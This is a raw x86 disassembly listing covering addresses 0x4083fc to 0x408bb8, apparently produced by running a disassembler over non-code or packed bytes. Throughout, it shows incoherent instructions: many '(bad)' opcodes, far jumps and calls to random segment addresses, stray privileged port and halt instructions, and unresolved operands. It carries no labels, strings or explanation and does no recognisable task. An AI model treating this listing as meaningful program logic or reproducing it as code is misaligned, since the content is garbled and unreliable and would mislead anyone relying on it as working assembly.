  4083fc:	sbb    BYTE PTR [ecx],cl
  4083fe:	rcr    edx,cl
  408400:	int3   
  408401:	pop    esi
  408402:	mov    WORD PTR [ebx-0x49],?
  408405:	arpl   WORD PTR [esi],cx
  408407:	xor    bl,dh
  408409:	sub    dl,ah
  40840b:	or     DWORD PTR [ecx],edx
  40840d:	sar    DWORD PTR [ecx],cl
  40840f:	cwde   
  408410:	mov    bh,ch
  408412:	sub    eax,0x468738b5
  408417:	nop    DWORD PTR [ecx-0xd]
  40841b:	cmovl  ebx,DWORD PTR [ebx+0x45]
  40841f:	dec    ebp
  408420:	inc    edx
  408421:	mov    eax,0xf5f66dfa
  408426:	inc    edx
  408427:	fdivr  QWORD PTR [esi+ebx*2]
  40842a:	fwait
  40842b:	loopne 0x408403
  40842d:	fbstp  TBYTE PTR cs:[eax]
  408430:	data16 jae 0x4083d9
  408433:	es call 0xe71:0x4352b1be
  40843b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40843c:	lods   eax,DWORD PTR ds:[esi]
  40843d:	call   0x982e8b23
  408442:	xchg   esi,eax
  408443:	mov    ebp,0xbbbad583
  408448:	mov    cl,0x94
  40844a:	rol    DWORD PTR [ecx-0x4c861938],1
  408450:	(bad)  
  408451:	push   ebx
  408452:	cs xchg ebx,eax
  408454:	mov    ah,bh
  408456:	pop    edx
  408457:	ror    BYTE PTR [esi],0xae
  40845a:	xchg   DWORD PTR [ebp-0x63b5356f],edi
  408460:	and    cl,ah
  408462:	mov    WORD PTR [esi],ss
  408464:	jae    0x4083fd
  408466:	xor    al,0x70
  408468:	sub    esp,DWORD PTR [ecx-0xa]
  40846b:	mov    DWORD PTR [edi+0x3861455c],ebp
  408471:	scas   al,BYTE PTR es:[edi]
  408472:	adc    eax,0x278e14a1
  408477:	jae    0x408480
  408479:	rcr    DWORD PTR [ecx-0x66],cl
  40847c:	xchg   ebp,eax
  40847d:	jbe    0x408437
  40847f:	cdq    
  408480:	call   0x4c22:0x5191848
  408487:	bound  ecx,QWORD PTR [ecx+0x14]
  40848a:	sbb    al,0x2b
  40848c:	jl     0x4084c1
  40848e:	xchg   edi,eax
  40848f:	mov    bl,0x2d
  408491:	pusha  
  408492:	adc    al,BYTE PTR [ecx+eax*8-0x62258dba]
  408499:	sbb    ebp,DWORD PTR [edx+0x30]
  40849c:	into   
  40849d:	and    al,0x7c
  40849f:	retf   
  4084a0:	mov    BYTE PTR [edx],cl
  4084a2:	test   BYTE PTR [eax],dh
  4084a4:	cld    
  4084a5:	cdq    
  4084a6:	or     DWORD PTR [ecx+ebp*8],ecx
  4084a9:	add    al,0x6
  4084ab:	in     eax,dx
  4084ac:	sti    
  4084ad:	dec    edi
  4084ae:	jno    0x4084d5
  4084b0:	ins    DWORD PTR es:[edi],dx
  4084b1:	lock cdq 
  4084b3:	cmp    bh,BYTE PTR [ebp+0x49]
  4084b6:	mov    ds:0x4aa69931,al
  4084bb:	jp     0x4084f9
  4084bd:	push   eax
  4084be:	adc    al,0x67
  4084c0:	enter  0xa97e,0x3a
  4084c4:	mov    ch,BYTE PTR [edi+0x64]
  4084c7:	and    ch,BYTE PTR [ecx+0x1a4333fe]
  4084cd:	jae    0x408544
  4084cf:	jmp    0xb314:0x46d92df3
  4084d6:	xchg   ecx,eax
  4084d7:	fdivp  st(1),st
  4084d9:	das    
  4084da:	jmp    FWORD PTR [esi+0x7a49ba9d]
  4084e0:	iret   
  4084e1:	int    0xc2
  4084e3:	lods   al,BYTE PTR ds:[esi]
  4084e4:	jle    0x40846f
  4084e6:	aas    
  4084e7:	sub    al,0x68
  4084e9:	clc    
  4084ea:	push   cs
  4084eb:	pop    edx
  4084ec:	inc    ecx
  4084ed:	dec    edi
  4084ee:	dec    eax
  4084ef:	xchg   esp,eax
  4084f0:	sbb    eax,0xe1d7cb8d
  4084f5:	mov    DWORD PTR [edx-0x4dae8371],ebx
  4084fb:	and    al,0x82
  4084fd:	pop    es
  4084fe:	cs int3 
  408500:	(bad)  
  408501:	pop    esp
  408502:	cld    
  408503:	and    BYTE PTR [esi-0x3b],dl
  408506:	retf   0x4146
  408509:	loope  0x4084b0
  40850b:	inc    esp
  40850c:	in     al,dx
  40850d:	in     eax,0xcd
  40850f:	(bad)  
  408510:	call   0xbac98bb5
  408515:	pop    eax
  408516:	xchg   esp,eax
  408517:	rcl    BYTE PTR [ebp-0x55fc0be],cl
  40851d:	jne    0x4084e0
  40851f:	test   al,0xe8
  408521:	(bad)  
  408523:	push   ebp
  408524:	scas   eax,DWORD PTR es:[edi]
  408525:	adc    eax,0x859f666a
  40852a:	stc    
  40852b:	popf   
  40852c:	add    ah,bl
  40852e:	stos   DWORD PTR es:[edi],eax
  40852f:	cmp    DWORD PTR [edi-0x38],edi
  408532:	jle    0x40853d
  408534:	mov    ebp,DWORD PTR [edx+esi*1-0x4d]
  408538:	ins    DWORD PTR es:[edi],dx
  408539:	pop    esp
  40853a:	pop    ebx
  40853b:	stc    
  40853c:	in     eax,0xe9
  40853e:	or     edx,eax
  408540:	leave  
  408541:	mov    ah,0xcc
  408543:	mov    dh,0x13
  408545:	push   edx
  408546:	stc    
  408547:	mov    ecx,0xec3e3bee
  40854c:	test   DWORD PTR [edx+0x4821929d],eax
  408552:	sbb    al,ch
  408554:	shr    ecx,0x43
  408557:	dec    esp
  408558:	test   bh,bl
  40855a:	add    ebp,eax
  40855c:	loopne 0x408551
  40855e:	fisub  WORD PTR [ecx-0x40]
  408561:	jns    0x4085dc
  408563:	mov    ?,WORD PTR [esi]
  408565:	mov    ds:0xc74f53ac,al
  40856a:	and    DWORD PTR [edx],0x61390785
  408570:	and    ah,BYTE PTR [edx+ecx*1+0x7eb8fcac]
  408577:	jle    0x4085f3
  408579:	repnz dec edi
  40857b:	sub    DWORD PTR [edx+0x62],0xfd800b21
  408582:	push   esi
  408583:	sub    esi,eax
  408585:	in     al,0x16
  408587:	rol    DWORD PTR [eax-0x7e],1
  40858a:	ins    BYTE PTR es:[edi],dx
  40858b:	add    eax,0x7b611b74
  408590:	add    dh,BYTE PTR [edx-0x69]
  408593:	aaa    
  408594:	in     eax,dx
  408595:	xchg   BYTE PTR [esi-0x11],bh
  408598:	loop   0x4085f8
  40859a:	scas   al,BYTE PTR es:[edi]
  40859b:	dec    ebp
  40859c:	push   es
  40859d:	loop   0x4085a9
  40859f:	adc    al,BYTE PTR [eax-0x2b99156e]
  4085a5:	fldcw  WORD PTR ds:0x6e727f62
  4085ab:	or     BYTE PTR [edx+ebp*8+0x349915d3],bl
  4085b2:	pushf  
  4085b3:	jmp    0x2133cd31
  4085b8:	inc    ecx
  4085b9:	inc    esi
  4085ba:	add    eax,edx
  4085bc:	data16 aas 
  4085be:	pop    ds
  4085bf:	test   eax,0x82e2c50f
  4085c4:	sbb    BYTE PTR [edx],bh
  4085c6:	mov    al,ds:0xe80e3812
  4085cb:	pushf  
  4085cc:	xlat   BYTE PTR ds:[ebx]
  4085cd:	inc    eax
  4085ce:	mov    BYTE PTR [eax+eiz*8+0x28efc5af],dh
  4085d5:	scas   al,BYTE PTR es:[edi]
  4085d6:	mov    bl,0xab
  4085d8:	mov    BYTE PTR [edi],dl
  4085da:	and    ecx,ebp
  4085dc:	mov    eax,ds:0xa3a9cb74
  4085e1:	imul   edx,DWORD PTR [edx-0x2f850a20],0x7b44f563
  4085eb:	add    dl,dl
  4085ed:	out    0xa6,al
  4085ef:	scas   eax,DWORD PTR es:[edi]
  4085f0:	mov    ebp,0xd7269881
  4085f5:	xchg   ebp,eax
  4085f6:	mov    dh,0x5a
  4085f8:	adc    eax,0x6c51e6cd
  4085fd:	(bad)  
  4085fe:	cmp    ch,BYTE PTR [edi-0x5e71f80]
  408604:	jmp    0x9433216b
  408609:	push   ecx
  40860a:	out    0x66,al
  40860c:	fdivp  st(0),st
  40860e:	push   0x59
  408610:	or     ah,BYTE PTR [esi]
  408612:	and    ah,BYTE PTR [ecx-0x7099a499]
  408618:	pop    ss
  408619:	loope  0x4085ab
  40861b:	xchg   edi,eax
  40861c:	sub    DWORD PTR [eax+0x6c],edi
  40861f:	xor    al,0x11
  408621:	xor    dh,BYTE PTR [ecx-0x30]
  408624:	ja     0x4085c3
  408626:	shl    DWORD PTR [eax],1
  408628:	aad    0x16
  40862a:	pushf  
  40862b:	and    dl,BYTE PTR [eax+0x29]
  40862e:	push   cs
  40862f:	ins    DWORD PTR es:[edi],dx
  408630:	scas   al,BYTE PTR es:[edi]
  408631:	jl     0x408678
  408633:	mov    eax,0xf8ceabe0
  408638:	dec    esi
  408639:	out    dx,eax
  40863a:	jge    0x408620
  40863c:	sbb    al,dl
  40863e:	pusha  
  40863f:	mov    ebx,0xaffff93c
  408644:	cmp    al,0x88
  408646:	retf   0x59bc
  408649:	imul   edi,edx,0xffffff8e
  40864c:	cmp    ebx,esp
  40864e:	cmp    edx,esi
  408650:	es clc 
  408652:	clc    
  408653:	and    BYTE PTR [ecx],0xdb
  408656:	(bad)  
  408657:	fcomp  DWORD PTR [esi]
  408659:	sub    eax,0x827cbcf7
  40865e:	outs   dx,DWORD PTR ds:[esi]
  40865f:	jmp    0x5a67:0x7842e100
  408666:	push   esp
  408667:	idiv   BYTE PTR [ebp-0x1d]
  40866a:	jnp    0x408690
  40866c:	in     eax,0xd4
  40866e:	inc    ebp
  40866f:	popf   
  408670:	fwait
  408671:	inc    edx
  408672:	or     DWORD PTR [ebx],edx
  408674:	mov    edi,0x7f57781d
  408679:	xchg   BYTE PTR [ecx+0x4b],ch
  40867c:	scas   eax,DWORD PTR es:[edi]
  40867d:	cmp    al,0xb7
  40867f:	fwait
  408680:	and    ecx,DWORD PTR [ecx-0x73dfdb69]
  408686:	inc    edx
  408687:	outs   dx,BYTE PTR ds:[esi]
  408688:	dec    ebp
  408689:	loop   0x408617
  40868b:	or     cl,BYTE PTR [ebx+0x71]
  40868e:	ror    BYTE PTR [eax+0x7d4b9c3f],1
  408694:	scas   eax,DWORD PTR es:[edi]
  408695:	jbe    0x4086f2
  408697:	fwait
  408698:	jle    0x408629
  40869a:	and    BYTE PTR [ecx],dh
  40869c:	pop    es
  40869d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40869e:	push   es
  40869f:	sub    bh,bl
  4086a1:	jl     0x408666
  4086a3:	sbb    al,0x5e
  4086a5:	cmc    
  4086a6:	imul   esp,DWORD PTR [edx-0x1826de52],0x5b
  4086ad:	adc    edi,DWORD PTR [edi]
  4086af:	fiadd  DWORD PTR [edi+0x308d45a6]
  4086b5:	xlat   BYTE PTR ds:[ebx]
  4086b6:	sub    dl,al
  4086b8:	sub    al,0x46
  4086ba:	shl    DWORD PTR [esi+0x5e],cl
  4086bd:	sub    al,0x56
  4086bf:	ins    DWORD PTR es:[edi],dx
  4086c0:	pop    ecx
  4086c1:	cdq    
  4086c2:	jnp    0x4086d3
  4086c4:	into   
  4086c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086c6:	arpl   WORD PTR [eax+0x7d193aa],cx
  4086cc:	dec    esp
  4086cd:	add    edi,DWORD PTR ds:0xf70bbcb8
  4086d3:	add    ebp,DWORD PTR ds:0x30293431
  4086d9:	shr    BYTE PTR [eax-0x67],cl
  4086dc:	fwait
  4086dd:	xlat   BYTE PTR ds:[ebx]
  4086de:	or     al,0xec
  4086e0:	cli    
  4086e1:	cli    
  4086e2:	pusha  
  4086e3:	jns    0x40872b
  4086e5:	aaa    
  4086e6:	aam    0x7a
  4086e8:	pushf  
  4086e9:	fimul  WORD PTR [ebp+0x46]
  4086ec:	arpl   WORD PTR [esp+ecx*4],di
  4086ef:	jmp    0x4086e4
  4086f1:	or     BYTE PTR [ebx],bh
  4086f3:	mov    dl,0x8b
  4086f5:	loopne 0x408757
  4086f7:	and    BYTE PTR [edx-0x7b46ad82],dl
  4086fd:	jecxz  0x4086b5
  4086ff:	ja     0x4086fc
  408701:	sub    DWORD PTR [edx-0x5ff42887],edi
  408707:	std    
  408708:	sbb    eax,0xe92f9cf7
  40870d:	add    ebp,DWORD PTR [esi]
  40870f:	cld    
  408710:	xchg   ebx,eax
  408711:	shl    bl,0x15
  408714:	cld    
  408715:	sti    
  408716:	or     DWORD PTR [ecx+0x5c5b87c6],ebx
  40871c:	and    eax,0xdea2a289
  408721:	push   esp
  408722:	into   
  408723:	fucomp st(6)
  408725:	xor    esp,DWORD PTR [esp+eax*8-0x1]
  408729:	jnp    0x408705
  40872b:	xor    eax,0x6fbe8d70
  408730:	fimul  DWORD PTR [eax]
  408732:	dec    edx
  408733:	ins    DWORD PTR es:[edi],dx
  408734:	clc    
  408735:	mov    bl,BYTE PTR [ecx]
  408737:	fwait
  408738:	adc    BYTE PTR [ebp-0x56],dh
  40873b:	ins    DWORD PTR es:[edi],dx
  40873c:	pop    ecx
  40873d:	push   ebx
  40873e:	push   0xfc2f18fb
  408743:	mov    bh,0x71
  408745:	inc    eax
  408746:	jmp    0x3e13:0x1af51c99
  40874d:	jno    0x408711
  40874f:	gs aam 0xb5
  408752:	(bad)  
  408754:	aas    
  408755:	mov    ch,0xd5
  408757:	mov    ebx,0xbaa60236
  40875c:	jbe    0x4086ec
  40875e:	push   edx
  40875f:	push   eax
  408760:	adc    esi,0xb2ada7ed
  408766:	jmp    0xcf6e:0x51aad82e
  40876d:	mov    esi,0x4a5f5436
  408772:	mov    eax,0x4e4198f0
  408777:	loopne 0x408758
  408779:	or     eax,eax
  40877b:	mov    bh,0x3c
  40877d:	ror    ah,cl
  40877f:	xor    edi,0x9d41eeda
  408785:	or     BYTE PTR [eax-0x320ab17e],ch
  40878b:	xor    bh,BYTE PTR [edx+edx*1-0x616ed84]
  408792:	adc    al,BYTE PTR [ebp-0x22]
  408795:	cs aam 0x1b
  408798:	fidivr WORD PTR [ecx+0x78ec65b0]
  40879e:	lock fidivr WORD PTR [ebx-0x36]
  4087a2:	mov    ch,0x2c
  4087a4:	dec    ecx
  4087a5:	pop    edi
  4087a6:	popa   
  4087a7:	dec    edx
  4087a8:	or     BYTE PTR [ebx-0x7c],ch
  4087ab:	sub    dh,dh
  4087ad:	or     BYTE PTR [esi+0x786b380d],0x7b
  4087b4:	sti    
  4087b5:	xchg   edx,eax
  4087b6:	je     0x4087e1
  4087b8:	mov    bh,ch
  4087ba:	rol    dh,1
  4087bc:	dec    eax
  4087bd:	mov    DWORD PTR [eax],ebx
  4087bf:	lea    eax,[esi]
  4087c1:	mov    cl,0x62
  4087c3:	jp     0x408749
  4087c5:	pushf  
  4087c6:	popf   
  4087c7:	inc    ebp
  4087c8:	pop    dx
  4087ca:	dec    ebx
  4087cb:	jge    0x408757
  4087cd:	ja     0x40882b
  4087cf:	mov    edi,0x125c8e9c
  4087d4:	mov    DWORD PTR [ebp+ecx*4-0x5e],esi
  4087d8:	xchg   DWORD PTR [ebp*1+0x3e79dd8a],esi
  4087df:	out    0x38,al
  4087e1:	dec    eax
  4087e2:	(bad)  
  4087e3:	inc    edi
  4087e4:	sbb    ebx,eax
  4087e6:	and    eax,0xa4265e5a
  4087eb:	or     al,0x94
  4087ed:	mov    ds:0xea0a3bf3,al
  4087f2:	add    DWORD PTR [ebx+edx*4+0x3077685f],edi
  4087f9:	jg     0x40883c
  4087fb:	imul   eax,DWORD PTR [eax-0x2b6e073a],0xa519631
  408805:	jbe    0x40883c
  408807:	sar    DWORD PTR ds:0xf7e41566,1
  40880d:	mov    edx,0x4e5e53c3
  408812:	xchg   esi,eax
  408813:	std    
  408814:	or     edi,DWORD PTR [eax-0x4b]
  408817:	mov    edx,0x5c23b685
  40881c:	mov    dl,0x8f
  40881e:	cmp    eax,0x6da469ee
  408823:	fcmovu st,st(5)
  408825:	jns    0x4087ce
  408827:	(bad)  
  408828:	xchg   ebx,eax
  408829:	fld    DWORD PTR [esi+ecx*8-0x25f85fcb]
  408830:	cmp    eax,0x3cc2b78
  408835:	in     al,dx
  408836:	mov    esi,DWORD PTR [ecx-0x54]
  408839:	inc    edi
  40883a:	cmp    BYTE PTR [ebx],0xfa
  40883d:	add    dl,dh
  40883f:	dec    edx
  408840:	loop   0x4087dc
  408842:	sub    DWORD PTR [edi],0xffffffcf
  408845:	enter  0x9721,0x44
  408849:	jbe    0x4088b4
  40884b:	sbb    DWORD PTR [esp+ecx*8],ebp
  40884e:	dec    esp
  40884f:	out    0x7e,al
  408851:	pop    edx
  408852:	aam    0x21
  408854:	mov    ds,WORD PTR [eax+ecx*1+0x470ddbbd]
  40885b:	stos   BYTE PTR es:[edi],al
  40885c:	shl    BYTE PTR [edx-0x545d4d23],0xcf
  408863:	and    al,0xc4
  408865:	and    cl,bl
  408867:	mov    dh,0x8e
  408869:	fcomp  DWORD PTR ds:0x3bb46c08
  40886f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408870:	and    BYTE PTR [edx-0x3c92ec69],bh
  408876:	clc    
  408877:	push   esp
  408878:	add    DWORD PTR [ebx-0x36],edx
  40887b:	loope  0x4088c3
  40887d:	call   FWORD PTR ss:[edx]
  408880:	ret    
  408881:	cs push edi
  408883:	mov    DWORD PTR ds:0xde21310,ebp
  408889:	or     BYTE PTR [ecx+0x5fe1046c],al
  40888f:	xlat   BYTE PTR ds:[ebx]
  408890:	ins    BYTE PTR es:[edi],dx
  408891:	nop
  408892:	daa    
  408893:	xchg   ebx,eax
  408894:	test   BYTE PTR [esi-0x5605a8dc],dh
  40889a:	outs   dx,DWORD PTR ds:[esi]
  40889b:	or     al,0xb5
  40889d:	pop    ds
  40889e:	lds    ebp,FWORD PTR [edx+0x3d]
  4088a1:	mov    eax,ds:0x44be84c8
  4088a6:	add    BYTE PTR [esi],bh
  4088a8:	es mov edx,esp
  4088ab:	lods   eax,DWORD PTR ds:[esi]
  4088ac:	rcr    BYTE PTR [esi+0x65d6b2c0],0x9b
  4088b3:	(bad)  
  4088b6:	or     DWORD PTR [edx-0x15],ebp
  4088b9:	or     DWORD PTR [esi],ebp
  4088bb:	xor    eax,0xa29545d1
  4088c0:	(bad)  ds:0xcb81d5a5
  4088c6:	and    edi,DWORD PTR [ebx]
  4088c8:	sub    DWORD PTR [eax+0x47b9a81],esi
  4088ce:	pop    ss
  4088cf:	in     eax,0x24
  4088d1:	xor    eax,0xe66ab62a
  4088d6:	dec    eax
  4088d7:	sbb    edx,DWORD PTR [edx-0x78]
  4088da:	fcom   QWORD PTR [ebx+0xb]
  4088dd:	aas    
  4088de:	inc    eax
  4088df:	clc    
  4088e0:	shl    BYTE PTR [edi],cl
  4088e2:	xchg   esp,eax
  4088e3:	inc    esi
  4088e4:	icebp  
  4088e5:	cmp    al,0x7d
  4088e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088e8:	or     al,0x95
  4088ea:	pop    eax
  4088eb:	pop    esp
  4088ec:	jnp    0x408944
  4088ee:	jecxz  0x408964
  4088f0:	pop    ecx
  4088f1:	cli    
  4088f2:	add    DWORD PTR [ebx-0x11cfc7e2],esp
  4088f8:	jo     0x4088e7
  4088fa:	(bad)  
  4088fb:	leave  
  4088fc:	xor    ah,ch
  4088fe:	(bad)  
  408900:	es cwde 
  408902:	adc    DWORD PTR [edi],0xffffffb9
  408905:	jbe    0x40897b
  408907:	loope  0x40892e
  408909:	jge    0x40895c
  40890b:	mov    al,0xb
  40890d:	fidiv  WORD PTR [ebx-0x36]
  408910:	or     bh,BYTE PTR [ecx+0x3d85e571]
  408916:	pop    eax
  408917:	add    BYTE PTR [edi+0x65],0x9
  40891b:	push   ecx
  40891c:	cmp    DWORD PTR [eax],edi
  40891e:	jno    0x40895f
  408920:	div    ecx
  408922:	ret    
  408923:	jnp    0x408997
  408925:	mov    ds:0x920073a1,al
  40892a:	scas   eax,DWORD PTR es:[edi]
  40892b:	pop    ds
  40892c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40892d:	sahf   
  40892e:	(bad)  
  40892f:	pop    ebx
  408930:	pop    ds
  408931:	or     al,0x89
  408933:	dec    ebx
  408934:	sub    DWORD PTR [ebp+0x37a1096d],0x963a6d8d
  40893e:	or     ebx,esi
  408940:	and    al,0xb1
  408942:	sub    DWORD PTR [ecx+ebp*1+0x7d430777],0x1e
  40894a:	cwde   
  40894b:	mov    ebp,0xbfccf77e
  408950:	pop    ecx
  408951:	inc    esp
  408952:	sub    esp,edi
  408954:	test   BYTE PTR [ebp-0x57e8b8d3],0x33
  40895b:	sar    BYTE PTR [edx+0x6d7a8279],cl
  408961:	jne    0x4088e8
  408963:	sub    ebp,edx
  408965:	xchg   ebp,eax
  408966:	icebp  
  408967:	jno    0x408956
  408969:	cmp    eax,0x4955d8bc
  40896e:	imul   BYTE PTR [eax-0xb359ba7]
  408974:	scas   eax,DWORD PTR es:[edi]
  408975:	adc    dl,dh
  408977:	dec    esi
  408978:	test   DWORD PTR [esi],edx
  40897a:	fdivr  st,st(6)
  40897c:	mov    ebp,0xf771dc5b
  408981:	sub    DWORD PTR [edx+0x6b],ecx
  408984:	pop    ebx
  408985:	(bad)  [eax+0x20f9288b]
  40898b:	ficom  WORD PTR ds:0xe34a993b
  408991:	pop    ebp
  408992:	mov    al,ds:0x5aa53ac
  408997:	call   0xd59f7068
  40899c:	stos   BYTE PTR es:[edi],al
  40899d:	mov    eax,ds:0x96cfb7ac
  4089a2:	jecxz  0x40898f
  4089a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089a5:	rcl    BYTE PTR [esi+0x6c],1
  4089a8:	and    DWORD PTR [ecx+0x3c],0x55
  4089ac:	pop    ecx
  4089ad:	jno    0x4089e7
  4089af:	push   es
  4089b0:	loop   0x4089d2
  4089b2:	or     al,0xe9
  4089b4:	mov    WORD PTR [edi-0x6eca1c55],?
  4089ba:	jl     0x40897f
  4089bc:	add    ah,bl
  4089be:	mov    edx,0x1346b878
  4089c3:	mov    edx,0xaf08f5ed
  4089c8:	dec    ebp
  4089c9:	loopne 0x40895a
  4089cb:	jle    0x4089ff
  4089cd:	mov    ecx,0x6b34b7f2
  4089d2:	inc    ebx
  4089d3:	sub    BYTE PTR [edi+0x51],bl
  4089d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089d7:	xor    eax,0x644c21ea
  4089dd:	scas   eax,DWORD PTR es:[edi]
  4089de:	pop    ecx
  4089df:	jb     0x4089ef
  4089e1:	rol    ah,0xa3
  4089e4:	scas   eax,DWORD PTR es:[edi]
  4089e5:	and    BYTE PTR [esp+ebp*1+0x30173351],ch
  4089ec:	inc    edx
  4089ed:	(bad)  
  4089ee:	cmc    
  4089ef:	scas   eax,DWORD PTR es:[edi]
  4089f0:	jl     0x4089d8
  4089f2:	pushf  
  4089f3:	pusha  
  4089f4:	xchg   edi,eax
  4089f5:	out    0x3e,eax
  4089f7:	mov    edi,0x19f6a01a
  4089fc:	sbb    BYTE PTR [ebx],ah
  4089fe:	mov    eax,0x19e648a9
  408a03:	int    0x4b
  408a05:	xchg   ebp,eax
  408a06:	xor    al,0xb9
  408a08:	leave  
  408a09:	jae    0x4089c2
  408a0b:	pushf  
  408a0c:	shl    BYTE PTR [eax-0x629cc5dc],0x8
  408a13:	test   al,0xf
  408a15:	call   ebx
  408a17:	add    eax,0x1e32ec7a
  408a1c:	clc    
  408a1d:	in     al,dx
  408a1e:	inc    edi
  408a1f:	outs   dx,BYTE PTR ds:[esi]
  408a20:	pop    esi
  408a21:	pop    esi
  408a22:	mov    WORD PTR [edx-0x2d643f24],0xd39f
  408a2b:	push   esi
  408a2c:	adc    ch,al
  408a2e:	mov    edi,0x275fb8b1
  408a33:	jecxz  0x408a2d
  408a35:	aam    0xf3
  408a37:	in     eax,0x8f
  408a39:	out    dx,eax
  408a3a:	fdivp  st(2),st
  408a3c:	ret    
  408a3d:	dec    edi
  408a3e:	mov    ecx,0x2b58e358
  408a43:	pop    ds
  408a44:	pop    ss
  408a45:	jne    0x4089dd
  408a47:	les    ecx,FWORD PTR fs:[eax+0x60]
  408a4b:	fwait
  408a4c:	adc    eax,DWORD PTR [edx-0x7c473c82]
  408a52:	aas    
  408a53:	pusha  
  408a54:	repnz mov bh,0xe9
  408a57:	(bad)  
  408a58:	(bad)  
  408a59:	leave  
  408a5a:	hlt    
  408a5b:	sbb    ch,BYTE PTR [eax]
  408a5d:	sahf   
  408a5e:	aad    0x49
  408a60:	(bad)  
  408a61:	stos   DWORD PTR es:[edi],eax
  408a62:	jnp    0x408a38
  408a64:	xlat   BYTE PTR ds:[ebx]
  408a65:	and    dh,BYTE PTR [ecx+0x28]
  408a68:	test   edi,eax
  408a6a:	or     esp,DWORD PTR fs:[ecx-0x13]
  408a6e:	test   al,0xcd
  408a70:	call   0xd6255fea
  408a75:	dec    esi
  408a76:	mov    eax,ds:0xf49ec779
  408a7b:	repz push eax
  408a7d:	dec    esi
  408a7e:	push   esp
  408a7f:	push   es
  408a80:	(bad)  [ebx+ebp*2-0xf4c433f]
  408a87:	xchg   cl,dl
  408a89:	dec    eax
  408a8a:	shr    DWORD PTR [edi+edx*4],1
  408a8d:	mov    ah,BYTE PTR [ebp+0x76]
  408a90:	fild   QWORD PTR [edx+0x31b6a8d6]
  408a96:	or     cl,BYTE PTR ds:0x29e12b7d
  408a9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a9d:	not    DWORD PTR [ecx]
  408a9f:	dec    eax
  408aa0:	ret    
  408aa1:	inc    esi
  408aa2:	(bad)
  408aa5:	jmp    0x55a5:0x920882e1
  408aac:	inc    esi
  408aad:	xchg   ebx,ebp
  408aaf:	(bad)  
  408ab0:	sbb    dl,BYTE PTR ds:0x1ce92d3
  408ab6:	inc    ebp
  408ab7:	out    dx,eax
  408ab8:	jne    0x408a7a
  408aba:	push   es
  408abb:	pop    edi
  408abc:	mov    al,ds:0xbb38a9ca
  408ac1:	test   BYTE PTR [edx],dl
  408ac3:	ja     0x408b06
  408ac5:	jge    0x408a55
  408ac7:	in     al,dx
  408ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ac9:	addr16 minps xmm6,xmm5
  408acd:	aaa    
  408ace:	push   ebx
  408acf:	mov    edx,0x4eedbea9
  408ad4:	sub    al,0x19
  408ad6:	dec    eax
  408ad7:	les    esi,FWORD PTR [ecx-0x28]
  408ada:	cs test bh,ch
  408add:	mov    ds:0x86bb4445,al
  408ae2:	(bad)  
  408ae4:	fld    st(6)
  408ae6:	daa    
  408ae7:	xchg   esi,eax
  408ae8:	out    0xcd,al
  408aea:	mov    dl,0x1d
  408aec:	or     eax,edi
  408aee:	clc    
  408aef:	mov    BYTE PTR [ecx+ebx*8],bl
  408af2:	add    ebx,ecx
  408af4:	cwde   
  408af5:	inc    ecx
  408af6:	outs   dx,DWORD PTR ds:[esi]
  408af7:	dec    edi
  408af8:	(bad)  
  408af9:	push   edx
  408afa:	fs repnz scas eax,DWORD PTR es:[edi]
  408afd:	mov    dh,0xd2
  408aff:	add    ebx,DWORD PTR [eax+0x8b356c]
  408b05:	stos   DWORD PTR es:[edi],eax
  408b06:	sahf   
  408b07:	jp     0x408b23
  408b09:	push   edi
  408b0a:	(bad)  
  408b0b:	ja     0x408b6f
  408b0d:	push   0x65
  408b0f:	gs jl  0x408b36
  408b12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b13:	xlat   BYTE PTR ds:[ebx]
  408b14:	iret   
  408b15:	cmc    
  408b16:	aas    
  408b17:	adc    eax,0x2021887c
  408b1c:	sar    BYTE PTR [esi+0x69ff923b],1
  408b22:	ins    BYTE PTR es:[edi],dx
  408b23:	mov    ah,0xd4
  408b25:	packuswb mm1,mm6
  408b28:	cs hlt 
  408b2a:	scas   al,BYTE PTR es:[edi]
  408b2b:	scas   al,BYTE PTR es:[edi]
  408b2c:	adc    BYTE PTR [esi],0x9a
  408b2f:	mov    eax,0x4c7d9ac9
  408b34:	sbb    BYTE PTR [esi-0x3],dl
  408b37:	adc    ecx,0x70
  408b3a:	stc    
  408b3b:	pop    eax
  408b3c:	jne    0x408bb4
  408b3e:	ds mov ebp,0x22086fe9
  408b44:	out    dx,al
  408b45:	test   DWORD PTR [edi+eiz*4],0x92135f3c
  408b4c:	mov    ds:0x215396c4,eax
  408b51:	dec    edx
  408b52:	retf   
  408b53:	loope  0x408bb6
  408b55:	je     0x408afc
  408b57:	sar    DWORD PTR [edi+ebx*1-0x7c0a6562],1
  408b5e:	xchg   esp,eax
  408b5f:	sub    al,0x90
  408b61:	sahf   
  408b62:	mov    WORD PTR [edi],fs
  408b64:	daa    
  408b65:	xor    ch,BYTE PTR [ecx-0x2db13488]
  408b6b:	inc    esi
  408b6c:	repnz cmp BYTE PTR [ebx],bl
  408b6f:	sbb    al,0xa8
  408b71:	imul   esi,DWORD PTR ds:0xdf8c260b,0x2492d1ca
  408b7b:	and    esp,DWORD PTR ds:[si-0x5a]
  408b80:	(bad)  
  408b81:	mov    ds:0xbbacf1b5,eax
  408b86:	jb     0x408b30
  408b88:	scas   al,BYTE PTR es:[edi]
  408b89:	jno    0x408bed
  408b8b:	fwait
  408b8c:	sti    
  408b8d:	daa    
  408b8e:	rol    esi,cl
  408b90:	aas    
  408b91:	mov    dl,0x86
  408b93:	repnz mov ebx,0x3fe893c1
  408b99:	in     eax,0x60
  408b9b:	push   eax
  408b9d:	push   ecx
  408b9e:	imul   ebx,ebp,0xaa535cf1
  408ba4:	dec    ebx
  408ba5:	or     DWORD PTR [edx+0x3],esi
  408ba8:	(bad)  
  408ba9:	pop    edi
  408baa:	sub    al,0x60
  408bac:	imul   ebp,ecx,0x2ae99938
  408bb2:	addr16 dec eax
  408bb4:	cmp    ch,dh
  408bb6:	jno    0x408bb5
  408bb8:	push   ss
